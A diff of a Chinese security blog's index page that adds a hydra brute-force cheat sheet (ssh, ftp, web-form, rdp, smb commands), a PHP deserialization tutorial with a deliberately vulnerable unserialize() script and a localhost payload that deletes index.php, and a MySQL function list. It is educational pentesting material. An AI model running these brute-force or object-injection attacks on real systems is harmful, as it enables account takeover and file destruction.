@@ -258,6 +258,694 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/29/爆破工具hydra笔记/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/04/29/爆破工具hydra笔记/" itemprop="url">
+                  爆破工具hydra笔记
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-29T21:17:42+08:00">
+                2018-04-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/笔记/" itemprop="url" rel="index">
+                    <span itemprop="name">笔记</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/04/29/爆破工具hydra笔记/" class="leancloud_visitors" data-flag-title="爆破工具hydra笔记">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x00-hydra"><a href="#0x00-hydra" class="headerlink" title="0x00 hydra"></a>0x00 hydra</h2><p>hydra 是一个网络帐号破解工具，支持多种协议。其作者是van Hauser,David Maciejak与其共同维护。hydra在所有支持GCC的平台能很好的编译，包括Linux,所有版本的BSD,Mac OS, Solaris等。</p>
+<h2 id="0x01-参数说明"><a href="#0x01-参数说明" class="headerlink" title="0x01 参数说明"></a>0x01 参数说明</h2><p>hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e ns]<br>[-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-f] [-s PORT] [-S] [-vV] server service [OPT]</p>
+<ul>
+<li>-R 继续从上一次进度接着破解。</li>
+<li>-S 采用SSL链接。</li>
+<li>-s PORT 可通过这个参数指定非默认端口。</li>
+<li>-l LOGIN 指定破解的用户，对特定用户破解。</li>
+<li>-L FILE 指定用户名字典。</li>
+<li>-p PASS 小写，指定密码破解，少用，一般是采用密码字典。</li>
+<li>-P FILE 大写，指定密码字典。</li>
+<li>-e ns 可选选项，n：空密码试探，s：使用指定用户和密码试探。</li>
+<li>-C FILE 使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数。</li>
+<li>-M FILE 指定目标列表文件一行一条。</li>
+<li>-o FILE 指定结果输出文件。</li>
+<li>-f 在使用-f参数以后，找到第一对登录名或者密码的时候中止破解。</li>
+<li>-t TASKS 同时运行的线程数，默认为16。</li>
+<li>-w TIME 设置最大超时的时间，单位秒，默认是30s。</li>
+<li>-v / -V 显示详细过程。</li>
+<li>server 目标ip</li>
+<li>service 指定服务名，支持的服务和协议：telnet ftp pop3[-ntlm] imap[-ntlm] smb smbnt http-{head|get} http-{get|post}-form http-proxy cisco cisco-enable vnc ldap2 ldap3 mssql mysql oracle-listener postgres nntp socks5 rexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh smtp-auth[-ntlm] pcanywhere teamspeak sip vmauthd firebird ncp afp等等。</li>
+<li>OPT 可选项</li>
+</ul>
+<h2 id="0x02-使用范例"><a href="#0x02-使用范例" class="headerlink" title="0x02 使用范例"></a>0x02 使用范例</h2><ul>
+<li>1.破解ssh：<br>hydra -l 用户名 -p 密码字典 -t 线程 ip ssh</li>
+<li>2.破解ftp：<br>hydra ip ftp -l 用户名 -P 密码字典 -t 线程</li>
+<li>3.破解web登录（get方式）：<br>hydra -l 用户名 -p 密码字典 -t 线程 -f ip http-get 127.0.0.1/admin/index.php</li>
+<li>4.破解web登录（post方式）：<br>hydra -l 用户名 -P 密码字典 -s 80 ip http-post-form “/admin/login.php:username=^USER^&amp;password=^PASS^&amp;submit=login”</li>
+<li>5.破解https：<br>hydra -m /index.php -l 用户名 -P 密码字典 ip https</li>
+<li>6.破解teamspeak：<br>hydra -l 用户名 -P 密码字典 -s 端口号 ip teamspeak</li>
+<li>7.破解cisco：<br>hydra -P 密码字典 ip cisco</li>
+<li>8.破解smb：<br>hydra -l 用户名 -P 密码字典 ip smb</li>
+<li>9.破解pop3：<br>hydra -l 用户名 -P 密码字典 my.pop3.mail pop3</li>
+<li>10.破解rdp：<br>hydra ip rdp -l 用户名 -P 密码字典 -V</li>
+<li>11.破解http-proxy：<br>hydra -l 用户名 -p 密码字典 -t 线程 http-proxy://xxx.xxx.xxx.xxx</li>
+<li>12.破解imap：<br>hydra -l 用户名 -P 密码字典 ip imap PLAIN</li>
+</ul>
+<h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>hydra支持多种协议的爆破，并且使用方式简单灵活，是暴力测试必备良器，只需要自行提供字典，或根据实际情况生成社工字典，就可以运用到绝大多数场景。</p>
+<p>这里提供一下博主经常使用的一些字典 <a href="https://github.com/echohun/tools/tree/master/%E5%AD%97%E5%85%B8" target="_blank" rel="noopener">https://github.com/echohun/tools/tree/master/%E5%AD%97%E5%85%B8</a></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/29/反序列化漏洞/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/04/29/反序列化漏洞/" itemprop="url">
+                  PHP反序列化漏洞
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-29T10:57:11+08:00">
+                2018-04-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/04/29/反序列化漏洞/" class="leancloud_visitors" data-flag-title="PHP反序列化漏洞">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x00-序列化和反序列化"><a href="#0x00-序列化和反序列化" class="headerlink" title="0x00 序列化和反序列化"></a>0x00 序列化和反序列化</h2><p>PHP序列化是将一个对象、数组、字符串等转化为字节流便于传输，比如跨脚本等。而PHP反序列化是将序列化之后的字节流还原成对象、字符、数组等。但是PHP序列化是不会保存对象的方法。  </p>
+<p>serialize可以将变量转换为字节流并且在转换中可以保存当前变量的值；unserialize则可以将serialize生成的字节流变换回变量。</p>
+<p>我们看一个序列化后再反序列化的例子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&apos;Content-Type: text/html; charset=gb2312&apos;);</span><br><span class="line">$arr=array();</span><br><span class="line">$arr[&apos;name&apos;]=&apos;名字&apos;;</span><br><span class="line">$arr[&apos;age&apos;]=&apos;21&apos;;</span><br><span class="line">$arr[&apos;sex&apos;]=&apos;男&apos;;</span><br><span class="line">$arr[&apos;phone&apos;]=&apos;12345678910&apos;;</span><br><span class="line">$arr[&apos;address&apos;]=&apos;上海&apos;;</span><br><span class="line">var_dump($arr);</span><br><span class="line">$info=serialize($arr);</span><br><span class="line">var_dump($info);</span><br><span class="line">$info_array=unserialize($info);</span><br><span class="line">var_dump($info_array);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>然后输出结果：</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/unserialize/unserialize01.png" alt=""></p>
+<h2 id="0x01-PHP反序列化漏洞"><a href="#0x01-PHP反序列化漏洞" class="headerlink" title="0x01 PHP反序列化漏洞"></a>0x01 PHP反序列化漏洞</h2><p>PHP类中有一种特殊函数体的存在叫魔法函数，magic函数命名是以符号<strong>开头的，比如 </strong>construct, <strong>destruct, </strong>toString, <strong>sleep, </strong>wakeup等等。这些函数在某些情况下会自动调用，比如<strong>construct当一个对象创建时被调用，</strong>destruct当一个对象销毁时被调用，__toString当一个对象被当作一个字符串使用。<br>而在反序列化时，如果反序列化对象中存在魔法函数，使用unserialize()函数同时也会触发。我们在变量可控并且进行了unserialize操作的地方注入序列化对象，实现代码执行，那么就可能引发对象注入漏洞。</p>
+<h2 id="0x02-简单测试"><a href="#0x02-简单测试" class="headerlink" title="0x02 简单测试"></a>0x02 简单测试</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line">    var $test = &quot;demo&quot;;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">            echo $this-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = $_GET[&apos;test&apos;];</span><br><span class="line">$a_unser = unserialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>比如上述代码，构造payload为<a href="http://127.0.0.1:800/test.php?test=O:1:&quot;A&quot;:1:{s:4:&quot;test&quot;;s:5:&quot;hello&quot;;}" target="_blank" rel="noopener">http://127.0.0.1:800/test.php?test=O:1:&quot;A&quot;:1:{s:4:&quot;test&quot;;s:5:&quot;hello&quot;;}</a><br>这里O表示对象，1表示对象名长度，”A”是对象名，下来的1是对象中的字段名，后面花括号中的s代表string，4代表长度，”test”是内容；s代表string，5代表长度，”hello”是内容。</p>
+<p>下面是一些数据类型的代表字母：</p>
+<ul>
+<li>a - array</li>
+<li>b - boolean</li>
+<li>d - double</li>
+<li>i - integer</li>
+<li>o - common object</li>
+<li>r - reference</li>
+<li>s - string</li>
+<li>C - custom object</li>
+<li>O - class</li>
+<li>N - null</li>
+<li>R - pointer reference</li>
+<li>U - unicode string</li>
+</ul>
+<p>反序列化后在脚本运行结束时就会调用_destruct函数，同时会覆盖test变量输出hello。</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/unserialize/unserialize02.png" alt=""></p>
+<h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p>我们再尝试一种方式利用漏洞。</p>
+<p>先创建logfile.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class LogFile    </span><br><span class="line">&#123;    </span><br><span class="line">    // log文件名</span><br><span class="line">    public $filename = &apos;error.log&apos;;</span><br><span class="line">    // 储存日志文件</span><br><span class="line">    public function LogData($text)    </span><br><span class="line">    &#123;    </span><br><span class="line">        echo &apos;Log some data: &apos; . $text . &apos;&lt;br /&gt;&apos;;    </span><br><span class="line">        file_put_contents($this-&gt;filename, $text, FILE_APPEND);    </span><br><span class="line">    &#125;</span><br><span class="line">    // 删除日志文件    </span><br><span class="line">    public function __destruct()    </span><br><span class="line">    &#123;    </span><br><span class="line">        echo &apos;__destruct deletes &quot;&apos; . $this-&gt;filename . &apos;&quot; file. &lt;br /&gt;&apos;;    </span><br><span class="line">        unlink(dirname(__FILE__) . &apos;/&apos; . $this-&gt;filename);    </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>这是一个很简单的日志文件处理的类，其中有一处需要注意的地方就是在对象消亡的时候，有一个析构函数来显示一条删除的提示并删除这个日志文件。</p>
+<p>下来我们看一个使用他的例子,创建一个日志文件1.log，再创建一个log.php写入如下内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &apos;logfile.php&apos;;    </span><br><span class="line">$obj = new LogFile();    </span><br><span class="line">$obj-&gt;filename = &apos;1.log&apos;;    </span><br><span class="line">$obj-&gt;LogData(&apos;Test&apos;);</span><br><span class="line">//一些操作</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>这个例子里，我们创建了一个新的LogFile对象，filename是1.log，然后在一些我们进行的操作之后，对象要消亡时1.log就会被删除。这是一个正常的使用方式。</p>
+<p>然后如果服务器其他位置的一个脚本unserialize.php可以进行反序列化，而且参数可控，比如下面代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &apos;logfile.php&apos;;    </span><br><span class="line">class User    </span><br><span class="line">&#123;    </span><br><span class="line">    // 类数据</span><br><span class="line">    public $age = 0;    </span><br><span class="line">    public $name = &apos;&apos;;</span><br><span class="line">    public function PrintData()    </span><br><span class="line">    &#123;    </span><br><span class="line">        echo &apos;User &apos; . $this-&gt;name . &apos; is &apos; . $this-&gt;age . &apos; years old. &lt;br /&gt;&apos;;    </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br><span class="line">$usr = unserialize($_GET[&apos;usr_serialized&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>然后我们就可以在这里利用反序列化来对服务器上文件进行删除操作。</p>
+<p>假如我们网站主页index.php是这样的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;exist&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>然后我们正常访问是：</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/unserialize/unserialize03.png" alt=""></p>
+<p>然后我们在刚才可以调用unserialize函数的页面，url后面构造如下内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/serialize/unserialize.php?usr_serialized=O:7:&quot;LogFile&quot;:1:&#123;s:8:&quot;filename&quot;;s:9:&quot;index.php&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/unserialize/unserialize04.png" alt=""></p>
+<p>就会发现，主页被删除：</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/unserialize/unserialize05.png" alt=""></p>
+<h2 id="0x04-应对"><a href="#0x04-应对" class="headerlink" title="0x04 应对"></a>0x04 应对</h2><ul>
+<li>严格控制unserialize函数的参数，对unserialize后的变量内容进行检查，过滤</li>
+</ul>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/28/mysql数据库内置函数总结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/04/28/mysql数据库内置函数总结/" itemprop="url">
+                  mysql数据库内置函数总结
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-28T22:30:35+08:00">
+                2018-04-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/笔记/" itemprop="url" rel="index">
+                    <span itemprop="name">笔记</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/04/28/mysql数据库内置函数总结/" class="leancloud_visitors" data-flag-title="mysql数据库内置函数总结">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>熟练的掌握mysql语法和函数是开发人员和安全工作中必备的技能，所以决定将mysql的内置函数全部整理一遍，用作笔记。</p>
+<h2 id="0x01-数学函数"><a href="#0x01-数学函数" class="headerlink" title="0x01 数学函数"></a>0x01 数学函数</h2><ul>
+<li>greatest()——返回一组数中的最大值</li>
+<li>least()——返回一组数中的最小值</li>
+<li>floor()——返回一个数的向下取整</li>
+<li>ceiling()——返回一个数的向上取整</li>
+<li>round()——返回一个数四舍五入后的整数值</li>
+<li>truncate()——把一个数字截取为指定小数位数的数字</li>
+<li>abs()——返回一个数的绝对值</li>
+<li>sign()——返回一个数的符号，正数返回1，负数返回-1，零返回0</li>
+<li>sqrt()——返回一个数的平方根</li>
+<li>pow()——以一个数作为另一个数的指数，并返回结果</li>
+<li>sin()——返回一个角度(弧度)的正弦</li>
+<li>cos()——返回一个角度(弧度)的余弦</li>
+<li>tan()——返回一个角度(弧度)的正切</li>
+<li>asin()——返回一个角度(弧度)的反正弦</li>
+<li>acon()——返回一个角度(弧度)的反余弦</li>
+<li>atan()——返回一个角度(弧度)的反正切</li>
+<li>bin()——返回一个数的二进制，作为字符串</li>
+<li>otc()——返回一个数的八进制，作为字符串</li>
+<li>hex()——返回一个数的十六进制，作为字符串</li>
+</ul>
+<h2 id="0x02-聚合函数"><a href="#0x02-聚合函数" class="headerlink" title="0x02 聚合函数"></a>0x02 聚合函数</h2><ul>
+<li>count()——求组中项数，返回int型整数</li>
+<li>max()——求最大值</li>
+<li>min()——求最小值</li>
+<li>sum()——返回表达式所有值的和</li>
+<li>avg()——求组中值的平均值</li>
+<li>std()——返回给定表达式中所有值的标准差</li>
+<li>variance()——返回给定表达式中所有值</li>
+<li>group_concat()——返回由属于一组的列值连接组合而成的结果</li>
+<li>bit_and()——逻辑与</li>
+<li>bit_or()——逻辑或</li>
+<li>bit_xor()——逻辑异或</li>
+</ul>
+<h2 id="0x03-字符串函数"><a href="#0x03-字符串函数" class="headerlink" title="0x03 字符串函数"></a>0x03 字符串函数</h2><ul>
+<li>ascii(char)——返回表达式最左端字符的ascii码值</li>
+<li>char(x1,x2,x3)——将括号中的多个数字转换成字符，结果组合成一个字符串</li>
+<li>left(str,x)——返回从字符串左边开始指定的x个字符</li>
+<li>right(str,x)——返回从字符串右边开始指定的x个字符</li>
+<li>trim(str)——删除字符串首部和尾部所有空格</li>
+<li>ltrim(str)——删除字符串首部所有空格</li>
+<li>rtrim(str)——删除字符串尾部所有空格</li>
+<li>rpad(str,n,pad)——用字符串pad对str的右边进行填补直到字符串str中字符大于等于n个，然后返回前n个字符</li>
+<li>lpad(str,n,pad)——用字符串pad对str的左边进行填补直到字符串str中字符大于等于n个，然后返回前n个字符</li>
+<li>replace(str1,str2,str3)——用字符串str3替换str1中出现的所有str2</li>
+<li>concat(str1,str2…strn)——连接字符串</li>
+<li>substring(expr,start,length)——返回expr中从start开始，长度为length的子串</li>
+<li>strcmp(str1,str2)——比较两个字符串，相等返回0，str1大返回1，str2大返回-1</li>
+</ul>
+<h2 id="0x04-日期和时间函数"><a href="#0x04-日期和时间函数" class="headerlink" title="0x04 日期和时间函数"></a>0x04 日期和时间函数</h2><ul>
+<li>now()——获取当前的日期和时间</li>
+<li>curtime()——获取当前的时间</li>
+<li>curdate()——获取当前的日期</li>
+<li>year()——分析一个日期值返回其中年的部分</li>
+<li>motnth()——以数值类型返回月的部分</li>
+<li>monthname()——以字符串的类型返回月的部分</li>
+<li>dayofyear()——返回这一天在这一年中的序数</li>
+<li>dayofmonth()——返回这一天在这一月中的序数</li>
+<li>dayofweek()——返回这一天在这一周中的序数</li>
+<li>hour()——返回时间值的小时部分</li>
+<li>minute()——返回时间值的分钟部分</li>
+<li>second()——返回时间值的秒部分</li>
+<li>data_add()——对日期进行增加操作</li>
+<li>data_sub()——对日期进行减少操作</li>
+</ul>
+<h2 id="0x05-加密函数"><a href="#0x05-加密函数" class="headerlink" title="0x05 加密函数"></a>0x05 加密函数</h2><ul>
+<li>aes_encrypt(str,key)和aes_decrypt(str,key)——对str用密钥key进行aes加密，解密</li>
+<li>encode()和decode()——对一个字符串进行加密，解密</li>
+<li>encrypt(str,key)——使用unix crypt()系统加密字符串（在windows上不可用）</li>
+<li>password(str)——返回str加密后的字符串</li>
+</ul>
+<h2 id="0x06-控制流函数"><a href="#0x06-控制流函数" class="headerlink" title="0x06 控制流函数"></a>0x06 控制流函数</h2><ul>
+<li>ifnull(expr1,expr2)——判断参数expr1是否为null，为null时返回expr2，否则返回expr1</li>
+<li>nullif(expr1,expr2)——判断两个参数是否相等，如相等，返回null，如不相等，返回第一个参数</li>
+<li>if(expr1,expr2,expr3)——如果expr1表达式为真，则返回expr2，否则返回expr3</li>
+</ul>
+<h2 id="0x07-格式化函数"><a href="#0x07-格式化函数" class="headerlink" title="0x07 格式化函数"></a>0x07 格式化函数</h2><ul>
+<li>format()——把数值格式化为以逗号为间隔的数字序列</li>
+<li>data_format()——把数值格式化成日期格式</li>
+<li>time_format()——把数值格式化为时间格式</li>
+</ul>
+<h2 id="0x08-类型转换函数"><a href="#0x08-类型转换函数" class="headerlink" title="0x08 类型转换函数"></a>0x08 类型转换函数</h2><ul>
+<li>cast(expr,AS type)——将一个值转换为指定的数据类型</li>
+</ul>
+<h2 id="0x09-系统信息函数"><a href="#0x09-系统信息函数" class="headerlink" title="0x09 系统信息函数"></a>0x09 系统信息函数</h2><ul>
+<li>database()——返回当前数据库名</li>
+<li>benchmark(n,expr)——将表达式expr重复运行n次</li>
+<li>charset()——返回字符串的字符集</li>
+<li>connection_id()——返回当前客户的连接id</li>
+<li>found_rows()——将最后一次select查询的行数返回</li>
+<li>user()——返回当前登陆的用户名</li>
+<li>version()——返回当前mysql服务器版本</li>
+</ul>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/26/文件包含漏洞/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1755,625 +2443,11 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/17/逻辑处理漏洞/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2018/04/17/逻辑处理漏洞/" itemprop="url">
-                  逻辑处理漏洞
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-17T18:32:46+08:00">
-                2018-04-17
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
